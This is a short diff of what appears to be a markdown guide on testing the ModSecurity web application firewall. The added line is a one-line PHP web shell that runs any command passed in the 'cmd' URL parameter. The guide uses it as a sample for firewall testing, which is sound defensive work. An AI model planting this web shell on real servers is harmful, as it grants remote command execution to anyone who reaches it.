@@ -16,4 +16,4 @@
 
 ### Testing ModSecurity
   - we will create a php webshell
-  - 
+  - <?php echo exec($_GET[‘cmd’]); ?>
